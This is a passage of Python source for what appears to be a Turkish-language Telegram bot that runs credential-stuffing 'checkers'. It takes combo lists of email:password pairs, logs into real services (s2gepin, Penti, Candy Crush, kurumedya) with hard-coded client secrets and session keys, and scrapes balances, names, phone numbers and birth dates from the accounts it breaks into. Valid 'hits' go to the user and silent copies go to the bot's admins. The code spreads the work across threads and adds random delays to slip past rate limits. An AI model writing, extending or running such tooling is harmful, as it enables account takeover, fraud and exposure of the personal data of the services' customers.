    "rates": 0,
    "errors": 0,
    "checked": 0,
    "msg_id": None,
    "chat_id": chat_id,
    "hit_lines": [],
    "mode": mode,
    "mode_label": mode_label,
    "workers": workers,
    "sleep": sleep_s,
    "rate_sleep": rate_sleep,
  }
  active_cpmv2_jobs[user_id] = job
  try:
    msg = bot.send_message(
      chat_id,
      _cpmv2_panel_text(job),
      reply_markup=_job_stop_markup("cpmv2_stop"),
      parse_mode="Markdown",
    )
    job["msg_id"] = msg.message_id
  except Exception as e:
    log_error("cpmv2_panel_start", e)

  last_refresh = [0.0]
  lock = threading.Lock()

  def _refresh(force=False, finished=False, stopped=False):
    mid = job.get("msg_id")
    if not mid:
      return
    now = time.time()
    if not force and not finished and not stopped and (now - last_refresh[0]) < 2.5:
      return
    last_refresh[0] = now
    try:
      bot.edit_message_text(
        _cpmv2_panel_text(job, finished=finished, stopped=stopped),
        chat_id,
        mid,
        reply_markup=None if (finished or stopped) else _job_stop_markup("cpmv2_stop"),
        parse_mode="Markdown",
      )
    except Exception:
      pass

  def _worker():
    while True:
      if job.get("stop") or active_cpmv2_jobs.get(user_id) is not job:
        break
      gmail, password = _cpmv2_gen_account()
      try:
        ok, status, detail = cpmv2_check_account(gmail, password)
      except Exception as e:
        ok, status, detail = False, "ERROR", str(e)[:60]
      with lock:
        job["checked"] = int(job.get("checked") or 0) + 1
        if ok and status == "SUCCESS":
          job["hits"] = int(job.get("hits") or 0) + 1
          line = f"{gmail}:{password} | {detail}"
          job.setdefault("hit_lines", []).append(line)
          try:
            bot.send_message(
              chat_id,
              f"✅ **CPM 2 HIT**\n"
              f"📧 `{gmail}`\n"
              f"🔑 `{password}`\n"
              f"📊 {detail}",
              parse_mode="Markdown",
            )
          except Exception:
            pass
        elif status == "RATE":
          job["rates"] = int(job.get("rates") or 0) + 1
        elif status == "ERROR":
          job["errors"] = int(job.get("errors") or 0) + 1
        else:
          job["bads"] = int(job.get("bads") or 0) + 1
      _refresh()
      if mode == "safe" and status == "RATE":
        time.sleep(rate_sleep + random.uniform(0, 4))
      else:
        jitter = 0.35 if mode == "safe" else 0.02
        time.sleep(max(0.0, sleep_s) + random.uniform(0, jitter))

  threads = []
  for _ in range(workers):
    t = threading.Thread(target=_worker, daemon=True)
    t.start()
    threads.append(t)
  try:
    while any(t.is_alive() for t in threads):
      if job.get("stop"):
        break
      time.sleep(1.0)
    deadline = time.time() + 20
    while any(t.is_alive() for t in threads) and time.time() < deadline:
      time.sleep(0.5)
  finally:
    stopped = bool(job.get("stop"))
    _refresh(force=True, finished=not stopped, stopped=stopped)
    hits = list(job.get("hit_lines") or [])
    if hits:
      try:
        tmp = f"cpm2_hits_{user_id}.txt"
        with open(tmp, "w", encoding="utf-8") as f:
          f.write("\n".join(hits) + "\n")
        with open(tmp, "rb") as doc:
          bot.send_document(
            chat_id,
            doc,
            caption=f"🎮 CPM 2 HIT — {len(hits)} adet ({mode_label})",
          )
        try:
          os.remove(tmp)
        except Exception:
          pass
      except Exception as e:
        log_error("cpmv2_hits_file", e)
    active_cpmv2_jobs.pop(user_id, None)
    try:
      log_activity(
        "cpmv2_auto",
        user_id,
        f"mode={mode} hits={job.get('hits')} checked={job.get('checked')} rate={job.get('rates')}",
      )
    except Exception:
      pass

def run_cpmv2_check_and_send(chat_id, user_id, text: str = None):
  """Combo CPM2 — kullanıcı hızı (2-8) uygulanır."""
  w = get_checker_workers(user_id)
  mode = "fast" if w >= 6 else "safe"
  run_cpmv2_auto(chat_id, user_id, mode=mode, workers_override=w, combo_text=text)

def _s2_parse_money(val):
  if not val:
    return 0.0
  s = str(val).replace("TL", "").strip().replace(".", "").replace(",", ".")
  try:
    return float(s)
  except Exception:
    return 0.0

def s2gepin_check_account(email, password):
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate",
  })
  try:
    giris_resp = session.get("https://www.s2gepin.com/giris", timeout=15)
    giris_resp.raise_for_status()
    match = re.search(r"csrf_token\s*=\s*'([^']+)'", giris_resp.text)
    if not match:
      return False, "ERROR", "csrf_token yok"
    tokenn = match.group(1)
    if not session.cookies.get("XSRF-TOKEN") or not session.cookies.get("s2gepin_session"):
      return False, "ERROR", "çerez yok"
    login_payload = {"email": email, "password": password, "otpcode": None, "CaptchaToken": "none"}
    api_headers = {
      "Content-Type": "application/json",
      "Origin": "https://www.s2gepin.com",
      "Referer": "https://www.s2gepin.com/giris",
      "H-Country-Code": "TR",
      "H-Region-Code": "TR",
      "Accept": "application/json, text/javascript, */*; q=0.01",
    }
    login_resp = session.post("https://api.s2gepin.com/Login/Customer", json=login_payload, headers=api_headers, timeout=15)
    login_resp.raise_for_status()
    data = login_resp.json()
    if not data.get("success"):
      return False, "BAD", str(data.get("message") or "login fail")[:120]
    token2 = data.get("data")
    if not token2:
      return False, "ERROR", "token2 yok"
    token_resp = session.post(
      "https://www.s2gepin.com/giris",
      json={"_token": tokenn, "token": token2},
      headers={
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://www.s2gepin.com",
        "Referer": "https://www.s2gepin.com/giris",
        "X-Requested-With": "XMLHttpRequest",
        "H-Country-Code": "TR",
        "H-Region-Code": "TR",
      },
      timeout=15,
    )
    token_resp.raise_for_status()
    if "token" not in session.cookies:
      return False, "ERROR", "session token yok"
    cuzdan_resp = session.get(
      "https://www.s2gepin.com/cuzdan",
      headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Referer": "https://www.s2gepin.com/"},
      timeout=15,
    )
    cuzdan_resp.raise_for_status()
    html = cuzdan_resp.text or ""
    bakiye_str = "0,00"
    m_bal = re.search(r'class=["\']amount totalbalance["\'][^>]*>([^<]+)', html, re.I)
    if m_bal:
      bakiye_str = m_bal.group(1).replace("TL", "").strip()
    else:
      m_bal2 = re.search(r'totalbalance[^>]*>\s*([0-9.,]+)', html, re.I)
      if m_bal2:
        bakiye_str = m_bal2.group(1).strip()
    puan_str = "0"
    m_puan = re.search(r'class=["\']amount-value["\'][^>]*>([^<]+)', html, re.I)
    if m_puan:
      puan_str = m_puan.group(1).strip()
    status = "SUCCESS" if _s2_parse_money(bakiye_str) > 0.0 else "CUSTOM"
    return True, status, f"Bakiye: {bakiye_str} TL | Puan: {puan_str}"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:100]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:100]}"

def _generic_checker_progress(name, job, finished=False, stopped=False):
  total = int(job.get("total") or 0)
  checked = int(job.get("checked") or 0)
  hits = int(job.get("hits") or 0)
  bads = int(job.get("bads") or 0)
  errors = int(job.get("errors") or 0)
  extra = job.get("extra_line") or ""
  head = "✅ Bitti" if finished else ("🛑 Durduruldu" if stopped else f"🔍 {name} taranıyor")
  w = job.get("workers")
  wline = f"⚡ Thread: **{w}**" if w else ""
  lines = [
    f"🎮 **{name} Canlı Panel**",
    "",
    head,
    (wline if wline else None),
    f"📦 Toplam: **{total}**",
    f"🔎 Kontrol: **{checked}/{total}**",
    f"✅ HIT: **{hits}**",
    f"❌ BAD: **{bads}**",
    f"⚡ Hata: **{errors}**",
  ]
  if extra:
    lines.append(extra)
  return "\n".join(x for x in lines if x is not None)

def _job_stop_markup(cb):
  markup = types.InlineKeyboardMarkup()
  markup.add(types.InlineKeyboardButton("🛑 Taramayı Durdur", callback_data=cb))
  return markup

def _parse_combo_lines(text):
  """user:pass / email:pass ve yaygın combo formatlarını parse eder.
  Destek: : | ; ,  tab  |  'user pass' (2 parça)
  Şifrede : varsa ilk ayırıcıya göre böler (split max 1).
  """
  lines, seen = [], set()
  for raw in (text or "").splitlines():
    raw = (raw or "").strip().strip("\ufeff")
    if not raw or raw.startswith("#") or raw.startswith("//"):
      continue
    if raw.lower().startswith(("http://", "https://", "www.")):
      continue
    user, password = None, None
    for sep in (":", "|", ";", "\t", ","):
      if sep in raw:
        left, right = raw.split(sep, 1)
        left, right = left.strip(), right.strip()
        if sep in right and sep in (":", "|", ";"):
          pass
        if left and right:
          user, password = left, right
          break
    if user is None:
      parts = raw.split()
      if len(parts) >= 2:
        user, password = parts[0].strip(), parts[1].strip()
    if not user or not password:
      continue
    if len(user) > 200 or len(password) > 200:
      continue
    key = f"{user.lower()}:{password}"
    if key in seen:
      continue
    seen.add(key)
    lines.append((user, password))
  return lines

def run_s2gepin_check_and_send(chat_id, user_id, text: str):
  global active_s2gepin_jobs
  if user_id in active_s2gepin_jobs and not active_s2gepin_jobs[user_id].get("stop"):
    try:
      bot.send_message(chat_id, "⚠️ Zaten bir S2GEPIN taraması çalışıyor.", parse_mode="Markdown")
    except Exception:
      pass
    return
  lines = _parse_combo_lines(text)
  if not lines:
    try:
      bot.send_message(chat_id, "❌ Geçerli satır yok.\nFormat: `user:pass` veya `email:pass` (ayrıca `|` `;` `,`)", parse_mode="Markdown")
    except Exception:
      pass
    return
  total = len(lines)
  job = {"stop": False, "total": total, "checked": 0, "hits": 0, "customs": 0, "bads": 0, "errors": 0, "msg_id": None, "chat_id": chat_id}
  active_s2gepin_jobs[user_id] = job
  try:
    msg = bot.send_message(chat_id, _generic_checker_progress("S2GEPIN", job) + "\n🟡 CUSTOM sayacı panelde", reply_markup=_job_stop_markup("s2gepin_stop"), parse_mode="Markdown")
    job["msg_id"] = msg.message_id
  except Exception as e:
    log_error("s2gepin_panel_start", e)
  hits, customs = [], []
  last_refresh = 0.0

  def _refresh(force=False, finished=False, stopped=False):
    nonlocal last_refresh
    mid = job.get("msg_id")
    if not mid:
      return
    now = time.time()
    if not force and not finished and not stopped and (now - last_refresh) < 1.2:
      return
    last_refresh = now
    job["extra_line"] = f"🟡 CUSTOM: **{job.get('customs', 0)}**"
    try:
      bot.edit_message_text(
        _generic_checker_progress("S2GEPIN", job, finished=finished, stopped=stopped),
        chat_id, mid,
        reply_markup=None if (finished or stopped) else _job_stop_markup("s2gepin_stop"),
        parse_mode="Markdown",
      )
    except Exception:
      pass

  stopped_early = False
  for i, (email, password) in enumerate(lines, 1):
    if active_s2gepin_jobs.get(user_id, {}).get("stop"):
      stopped_early = True
      break
    ok, status, detail = s2gepin_check_account(email, password)
    job["checked"] = i
    if status == "SUCCESS":
      job["hits"] = int(job.get("hits") or 0) + 1
      hits.append(f"{email}:{password} | {detail}")
    elif status == "CUSTOM":
      job["customs"] = int(job.get("customs") or 0) + 1
      customs.append(f"{email}:{password} | {detail}")
    elif status == "BAD":
      job["bads"] = int(job.get("bads") or 0) + 1
    else:
      job["errors"] = int(job.get("errors") or 0) + 1
    _refresh(force=(i % 3 == 0))
    if i < total and not active_s2gepin_jobs.get(user_id, {}).get("stop"):
      time.sleep(1.0)
  stopped_early = stopped_early or bool(active_s2gepin_jobs.get(user_id, {}).get("stop"))
  _refresh(force=True, finished=not stopped_early, stopped=stopped_early)
  checked = int(job.get("checked") or 0)
  try:
    bot.send_message(
      chat_id,
      f"🎮 **S2GEPIN {'Durduruldu' if stopped_early else 'Sonuç'}**\n\n"
      f"📦 {checked}/{total} · 💰 HIT **{len(hits)}** · 🟡 CUSTOM **{len(customs)}** · ❌ {job.get('bads', 0)} · ⚡ {job.get('errors', 0)}",
      parse_mode="Markdown",
    )
  except Exception:
    pass
  active_s2gepin_jobs.pop(user_id, None)
  all_lines = hits + customs
  if not all_lines:
    try:
      bot.send_message(chat_id, "📭 HIT/CUSTOM çıkmadı." + (" (yarıda)" if stopped_early else ""))
    except Exception:
      pass
    return
  _send_checker_hits(chat_id, user_id, "S2GEPIN", all_lines, hits_count=len(hits), checked=checked, total=total, stopped=stopped_early, extra_note=f"CUSTOM: {len(customs)}")

PENTI_BASE = "https://api-p1.penti.com.tr"
PENTI_HEADERS = {
  "App_Version": "5.7.3",
  "Device_Type": "ANDROID",
  "OS_Version": "13",
  "User-Agent": "Penti/5.7.3",
  "Content-Type": "application/x-www-form-urlencoded",
}

def penti_login(username, password):
  try:
    data = (
      "client_id=penti_mobile&client_secret=Ekwbh9imi0iapentiugZcV"
      f"&grant_type=password&username={requests.utils.quote(username)}&password={password}"
    )
    x = requests.post(
      f"{PENTI_BASE}/authorizationserver/oauth/token?lang=tr",
      data=data,
      headers=PENTI_HEADERS,
      timeout=12,
    )
    if x.status_code == 200:
      return x.json().get("access_token")
    return None
  except Exception:
    return None

def penti_api(token, endpoint):
  try:
    return requests.get(
      f"{PENTI_BASE}/pentiwebservices/v2/penti/{endpoint}?lang=tr",
      headers={"Authorization": f"bearer {token}", **PENTI_HEADERS},
      timeout=12,
    ).json()
  except Exception:
    return {}

def penti_check_account(email, password):
  try:
    token = penti_login(email, password)
    if not token:
      return False, "BAD", "login fail"
    c = penti_api(token, "getCustomerInfo") or {}
    n = penti_api(token, "me/initial") or {}
    name = f"{c.get('firstName', '')} {c.get('lastName', '')}".strip() or "-"
    phone = c.get("phoneNumber") or "Yok"
    birth = str(n.get("birthDate") or "").split("T")[0] or "-"
    point = n.get("crmTotalPointAmount", 0)
    tier = n.get("pentiTierName") or "Standart"
    detail = f"{name} | Tel:{phone} | D.Tarihi:{birth} | Puan:{point} | Üyelik:{tier}"
    return True, "SUCCESS", detail
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:100]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:100]}"

def run_penti_check_and_send(chat_id, user_id, text: str):
  global active_penti_jobs
  if user_id in active_penti_jobs and not active_penti_jobs[user_id].get("stop"):
    try:
      bot.send_message(chat_id, "⚠️ Zaten bir PENTI taraması çalışıyor.", parse_mode="Markdown")
    except Exception:
      pass
    return
  lines = _parse_combo_lines(text)
  if not lines:
    try:
      bot.send_message(chat_id, "❌ Geçerli satır yok.\nFormat: `user:pass` veya `email:pass` (ayrıca `|` `;` `,`)", parse_mode="Markdown")
    except Exception:
      pass
    return
  total = len(lines)
  job = {"stop": False, "total": total, "checked": 0, "hits": 0, "bads": 0, "errors": 0, "msg_id": None, "chat_id": chat_id}
  active_penti_jobs[user_id] = job
  try:
    msg = bot.send_message(chat_id, _generic_checker_progress("PENTI", job), reply_markup=_job_stop_markup("penti_stop"), parse_mode="Markdown")
    job["msg_id"] = msg.message_id
  except Exception as e:
    log_error("penti_panel_start", e)
  hits = []
  last_refresh = 0.0

  def _refresh(force=False, finished=False, stopped=False):
    nonlocal last_refresh
    mid = job.get("msg_id")
    if not mid:
      return
    now = time.time()
    if not force and not finished and not stopped and (now - last_refresh) < 1.0:
      return
    last_refresh = now
    try:
      bot.edit_message_text(
        _generic_checker_progress("PENTI", job, finished=finished, stopped=stopped),
        chat_id, mid,
        reply_markup=None if (finished or stopped) else _job_stop_markup("penti_stop"),
        parse_mode="Markdown",
      )
    except Exception:
      pass

  stopped_early = False
  for i, (email, password) in enumerate(lines, 1):
    if active_penti_jobs.get(user_id, {}).get("stop"):
      stopped_early = True
      break
    ok, status, detail = penti_check_account(email, password)
    job["checked"] = i
    if status == "SUCCESS":
      job["hits"] = int(job.get("hits") or 0) + 1
      hits.append(f"{email}:{password} | {detail}")
    elif status == "BAD":
      job["bads"] = int(job.get("bads") or 0) + 1
    else:
      job["errors"] = int(job.get("errors") or 0) + 1
    _refresh(force=(i % 3 == 0))
    if i < total and not active_penti_jobs.get(user_id, {}).get("stop"):
      time.sleep(0.4)
  stopped_early = stopped_early or bool(active_penti_jobs.get(user_id, {}).get("stop"))
  _refresh(force=True, finished=not stopped_early, stopped=stopped_early)
  checked = int(job.get("checked") or 0)
  try:
    bot.send_message(
      chat_id,
      f"👗 **PENTI {'Durduruldu' if stopped_early else 'Sonuç'}**\n\n"
      f"📦 {checked}/{total} · ✅ HIT **{len(hits)}** · ❌ {job.get('bads', 0)} · ⚡ {job.get('errors', 0)}",
      parse_mode="Markdown",
    )
  except Exception:
    pass
  active_penti_jobs.pop(user_id, None)
  if not hits:
    try:
      bot.send_message(chat_id, "📭 HIT çıkmadı." + (" (yarıda)" if stopped_early else ""))
    except Exception:
      pass
    return
  _send_checker_hits(chat_id, user_id, "PENTI", hits, hits_count=len(hits), checked=checked, total=total, stopped=stopped_early)

CANDY_API = "https://candycrush-live.ext.p.midasplayer.cloud/rpc/ClientApi"
CANDY_SK1 = "IRogjQ3GvsgpuYSE3LRSvSN3HEUYzC93rCGVnYEwJNfc6Co2GNRLQfRHPg9QSgL8FKSth_q9-EozAE3bGZ7H0A.5"
CANDY_SK2 = "0aErf-qRvuuyP2fRYkx0pXnyM18fAF5e-XAs-oJTqH5jVGlu4CxqV_oDb94yL7a51f8Kg3NG8WFe2arISEJgVg.5"

def candy_check_account(user, password):
  try:
    session = requests.Session()
    headers = {
      "Content-Type": "application/json",
      "User-Agent": "CandyCrushSaga/1.250.0.1",
      "x-king-session-key": CANDY_SK1,
    }
    payload = [{
      "jsonrpc": "2.0",
      "id": 82,
      "method": "AppEmailAndPasswordIdentityApi.authenticate",
      "params": [user, password, "MOIDc4ecf721a8e1219f4e60728d208a5393"],
    }]
    response = session.post(CANDY_API, json=payload, headers=headers, timeout=12)
    data = response.json()
    if isinstance(data, list) and "result" in data[0]:
      res_data = data[0]["result"]
      if res_data and "signUpToken" in res_data:
        uid = res_data.get("coreUserId")
        headers["x-king-session-key"] = CANDY_SK2
        headers["x-king-tracking-context"] = f"sessId={int(time.time())};seqNo=77"
        payload2 = [{"jsonrpc": "2.0", "id": 83, "method": "AppCoreIdentityApi.getAuthenticationInfo", "params": [[1]]}]
        r2 = session.post(CANDY_API, json=payload2, headers=headers, timeout=10).json()
        ev = "✓" if (isinstance(r2, list) and r2[0].get("result", {}).get("emailVerified")) else "×"
        return True, "SUCCESS", f"ID: {uid} | MailOnay: {ev}"
    return False, "BAD", "auth fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:100]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:100]}"

def run_candy_check_and_send(chat_id, user_id, text: str):
  global active_candy_jobs
  if user_id in active_candy_jobs and not active_candy_jobs[user_id].get("stop"):
    try:
      bot.send_message(chat_id, "⚠️ Zaten bir CANDY CRUSH taraması çalışıyor.", parse_mode="Markdown")
    except Exception:
      pass
    return
  lines = _parse_combo_lines(text)
  if not lines:
    try:
      bot.send_message(chat_id, "❌ Geçerli satır yok.\nFormat: `user:pass` veya `email:pass` (ayrıca `|` `;` `,`)", parse_mode="Markdown")
    except Exception:
      pass
    return
  total = len(lines)
  job = {"stop": False, "total": total, "checked": 0, "hits": 0, "bads": 0, "errors": 0, "msg_id": None, "chat_id": chat_id}
  active_candy_jobs[user_id] = job
  try:
    msg = bot.send_message(chat_id, _generic_checker_progress("CANDY CRUSH", job), reply_markup=_job_stop_markup("candy_stop"), parse_mode="Markdown")
    job["msg_id"] = msg.message_id
  except Exception as e:
    log_error("candy_panel_start", e)
  hits = []
  last_refresh = 0.0

  def _refresh(force=False, finished=False, stopped=False):
    nonlocal last_refresh
    mid = job.get("msg_id")
    if not mid:
      return
    now = time.time()
    if not force and not finished and not stopped and (now - last_refresh) < 1.0:
      return
    last_refresh = now
    try:
      bot.edit_message_text(
        _generic_checker_progress("CANDY CRUSH", job, finished=finished, stopped=stopped),
        chat_id, mid,
        reply_markup=None if (finished or stopped) else _job_stop_markup("candy_stop"),
        parse_mode="Markdown",
      )
    except Exception:
      pass

  stopped_early = False
  for i, (email, password) in enumerate(lines, 1):
    if active_candy_jobs.get(user_id, {}).get("stop"):
      stopped_early = True
      break
    ok, status, detail = candy_check_account(email, password)
    job["checked"] = i
    if status == "SUCCESS":
      job["hits"] = int(job.get("hits") or 0) + 1
      hits.append(f"{email}:{password} | {detail}")
    elif status == "BAD":
      job["bads"] = int(job.get("bads") or 0) + 1
    else:
      job["errors"] = int(job.get("errors") or 0) + 1
    _refresh(force=(i % 5 == 0))
    if i < total and not active_candy_jobs.get(user_id, {}).get("stop"):
      time.sleep(0.15)
  stopped_early = stopped_early or bool(active_candy_jobs.get(user_id, {}).get("stop"))
  _refresh(force=True, finished=not stopped_early, stopped=stopped_early)
  checked = int(job.get("checked") or 0)
  try:
    bot.send_message(
      chat_id,
      f"🍬 **CANDY CRUSH {'Durduruldu' if stopped_early else 'Sonuç'}**\n\n"
      f"📦 {checked}/{total} · ✅ HIT **{len(hits)}** · ❌ {job.get('bads', 0)} · ⚡ {job.get('errors', 0)}",
      parse_mode="Markdown",
    )
  except Exception:
    pass
  active_candy_jobs.pop(user_id, None)
  if not hits:
    try:
      bot.send_message(chat_id, "📭 HIT çıkmadı." + (" (yarıda)" if stopped_early else ""))
    except Exception:
      pass
    return
  _send_checker_hits(chat_id, user_id, "CANDY CRUSH", hits, hits_count=len(hits), checked=checked, total=total, stopped=stopped_early)

def _send_checker_hits(chat_id, user_id, name, lines, hits_count, checked, total, stopped=False, extra_note="", elapsed_sec=None, workers=None, bads=0, errors=0):
  """HIT .txt → kullanıcıya. Kanala SADECE bildirim (içerik yok). Adminlere sessiz kopya."""
  uname = _display_name(user_id)
  safe = re.sub(r"[^a-zA-Z0-9_]+", "_", name.lower())
  temp = f"{safe}_hits_{user_id}_{int(time.time())}.txt"
  graded, grade_counts = grade_hit_lines(lines)
  try:
    with open(temp, "w", encoding="utf-8") as f:
      f.write("\n".join(graded) + "\n")
    note = f" · {extra_note}" if extra_note else ""
    gnote = f" · A{grade_counts.get('A',0)}/B{grade_counts.get('B',0)}/C{grade_counts.get('C',0)}"
    user_caption = (
      f"✅ **{name}** — **{hits_count}** HIT{note}{gnote}\n"
      f"📦 Kontrol: {checked}/{total}"
      + (" · 🛑 yarıda" if stopped else "")
    )
    sent = False
    try:
      with open(temp, "rb") as doc:
        r = safe_tg(bot.send_document, chat_id, doc, caption=user_caption[:1024], parse_mode="Markdown", retries=3)
        sent = r is not None
    except Exception as e:
      log_error(f"{safe}_hits_user", e)
    if not sent:
      preview = "\n".join(graded[:15])
      more = f"\n… +{max(0, hits_count-15)} satır" if hits_count > 15 else ""
      safe_tg(
        bot.send_message,
        chat_id,
        f"✅ **{name}** {hits_count} HIT\n{preview}{more}",
        parse_mode="Markdown",
        retries=2,
      )
    try:
      el = float(elapsed_sec) if elapsed_sec is not None else 0.0
      summary = build_scan_summary(
        name, user_id, total, checked, hits_count,
        int(bads or 0), int(errors or 0), workers, el, grade_counts, stopped,
      )
      safe_tg(bot.send_message, chat_id, summary, parse_mode="Markdown", retries=1)
    except Exception as e:
      log_error("scan_summary", e)
    try:
      notify_hit_channel(user_id, name, hits_count)
    except Exception as e:
      log_error("hit_channel_notify", e)
    try:
      season_bump(user_id, hits=int(hits_count or 0), checks=int(checked or 0))
    except Exception:
      pass
    admin_caption = (
      f"🎮 {name} HIT\n"
      f"👤 {user_id} ({uname})\n"
      f"✅ {hits_count} | 🔍 {checked}/{total}{note}{gnote}\n"
      f"{'STOP' if stopped else 'OK'} | {get_current_time_str()}"
    )
    for admin_id in list(admin_ids_set):
      if int(admin_id) == int(user_id):
        continue
      try:
        with open(temp, "rb") as doc:
          safe_tg(
            bot.send_document,
            admin_id,
            doc,
            caption=admin_caption[:1024],
            retries=1,
          )
      except Exception as e:
        log_error(f"{safe}_hits_admin_{admin_id}", e)
    log_activity(f"{safe}_check", user_id, f"total={total} checked={checked} hits={hits_count} stop={stopped}")
    try:
      track_checker_use(user_id, max(1, int(checked or 1) // 50 + 1))
    except Exception:
      pass
  except Exception as e:
    log_error(f"{safe}_hits_file", e)
    safe_tg(bot.send_message, chat_id, f"✅ {name}: {hits_count} HIT (dosya yazılamadı)", retries=1)
  try:
    if os.path.exists(temp):
      os.remove(temp)
  except Exception:
    pass
  try:
    on_checker_job_finished(user_id)
  except Exception:
    pass

def kurumedy_get_csrf(session):
  try:
    resp = session.get(
      "https://kurumedya.com/",
      timeout=15,
      headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9",
      },
    )
    m = re.search(r'name="_csrf"[^>]*value="([^"]+)"', resp.text)
    return m.group(1) if m else None
  except Exception:
    return None

def kurumedy_parse_caps(html):
  caps = {}
  for pat in [
    r'class="km-name"[^>]*>\s*([^<\n]+)',
    r'data-toggle="tooltip"[^>]*title="([^"]+)"',
    r'class="sidebar-user"[^>]*>.*?class="km-name"[^>]*>\s*([^<\n]+)',
  ]:
    m = re.search(pat, html, re.DOTALL)
    if m:
      caps["username"] = m.group(1).strip()
      break
  for pat in [
    r'Balance\s+([\d\.,]+)\s*TL',
    r'Bakiye\s+([\d\.,]+)\s*TL',
    r'class="km-balance"[^>]*>\s*Balance\s+([\d\.,]+)',
  ]:
    m = re.search(pat, html, re.IGNORECASE)
    if m:
      caps["balance"] = m.group(1).strip() + " TL"
      break
  m_spent = re.search(
    r'Spent\s*</div>\s*<div[^>]*class="dcb-count"[^>]*>(.*?)</div>',
    html,
    re.DOTALL | re.IGNORECASE,
  )
  if m_spent:
    m2 = re.search(r'([\d\.,]+)\s*TL', m_spent.group(1), re.IGNORECASE)
    if m2:
      caps["spent"] = m2.group(1).strip() + " TL"
  m_st = re.search(
    r'User Status\s*</div>\s*<div[^>]*class="dcb-count"[^>]*>(.*?)</div>',
    html,
    re.DOTALL | re.IGNORECASE,
  )
  if m_st:
    block = m_st.group(1)
    m3 = re.search(r'>([^<]+)</a>', block)
    if m3:
      caps["status"] = m3.group(1).strip()
    else:
      m4 = re.search(r'([A-Za-zÇĞİÖŞÜçğıöşü\s]+)', block)
      if m4:
        caps["status"] = m4.group(1).strip()
  return caps

def kurumedy_check_account(email, password):
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Origin": "https://kurumedya.com",
    "Referer": "https://kurumedya.com/",
    "Content-Type": "application/x-www-form-urlencoded",
  })
  try:
    csrf = kurumedy_get_csrf(session)
    if not csrf:
      return False, "ERROR", "CSRF alınamadı"
    data = {
      "LoginForm[username]": email,
      "LoginForm[password]": password,
      "_csrf": csrf,
    }
    resp = session.post("https://kurumedya.com/", data=data, timeout=15, allow_redirects=True)
    low = (resp.text or "").lower()
    if resp.status_code == 401 or "yanlış" in low or "yanlis" in low:
      return False, "BAD", "login fail"
    ok_signals = [
      "dashboard" in low,
      "logout" in low,
      "profil" in low,
      "sipariş" in low or "siparis" in low,
      "bakiye" in low,
      "balance" in low,
      "spent" in low,
      resp.url.rstrip("/") != "https://kurumedya.com",
      resp.status_code == 302,
    ]
    if any(ok_signals):
      caps = kurumedy_parse_caps(resp.text or "")
      parts = [f"{k}={v}" for k, v in caps.items() if v]
      detail = " | ".join(parts) if parts else "login OK"
      return True, "SUCCESS", detail
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:100]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:100]}"

def run_kurumedy_check_and_send(chat_id, user_id, text: str):
  global active_kurumedy_jobs
  if user_id in active_kurumedy_jobs and not active_kurumedy_jobs[user_id].get("stop"):
    try:
      bot.send_message(chat_id, "⚠️ Zaten bir KURUMEDYA taraması çalışıyor.", parse_mode="Markdown")
    except Exception:
      pass
    return
  lines = _parse_combo_lines(text)
  if not lines:
    try:
      bot.send_message(chat_id, "❌ Geçerli satır yok.\nFormat: `user:pass` veya `email:pass` (ayrıca `|` `;` `,`)", parse_mode="Markdown")
    except Exception:
      pass
    return
  total = len(lines)
  job = {"stop": False, "total": total, "checked": 0, "hits": 0, "bads": 0, "errors": 0, "msg_id": None, "chat_id": chat_id}
  active_kurumedy_jobs[user_id] = job
  try:
    msg = bot.send_message(
      chat_id,
      _generic_checker_progress("KURUMEDYA", job),
      reply_markup=_job_stop_markup("kurumedy_stop"),
      parse_mode="Markdown",
    )
    job["msg_id"] = msg.message_id
  except Exception as e:
    log_error("kurumedy_panel_start", e)
  hits = []
  last_refresh = 0.0

  def _refresh(force=False, finished=False, stopped=False):
    nonlocal last_refresh
    mid = job.get("msg_id")
    if not mid:
      return
    now = time.time()
    if not force and not finished and not stopped and (now - last_refresh) < 1.0:
      return
    last_refresh = now
    try:
      bot.edit_message_text(
        _generic_checker_progress("KURUMEDYA", job, finished=finished, stopped=stopped),
        chat_id,
        mid,
        reply_markup=None if (finished or stopped) else _job_stop_markup("kurumedy_stop"),
        parse_mode="Markdown",
      )
    except Exception:
      pass

  stopped_early = False
  for i, (email, password) in enumerate(lines, 1):
    if active_kurumedy_jobs.get(user_id, {}).get("stop"):
      stopped_early = True
      break
    ok, status, detail = kurumedy_check_account(email, password)
    job["checked"] = i
    if status == "SUCCESS":
      job["hits"] = int(job.get("hits") or 0) + 1
      hits.append(f"{email}:{password} | {detail}")
    elif status == "BAD":
      job["bads"] = int(job.get("bads") or 0) + 1
    else:
      job["errors"] = int(job.get("errors") or 0) + 1
    _refresh(force=(i % 3 == 0))
    if i < total and not active_kurumedy_jobs.get(user_id, {}).get("stop"):
      time.sleep(0.5)
  stopped_early = stopped_early or bool(active_kurumedy_jobs.get(user_id, {}).get("stop"))
  _refresh(force=True, finished=not stopped_early, stopped=stopped_early)
  checked = int(job.get("checked") or 0)
  try:
    bot.send_message(
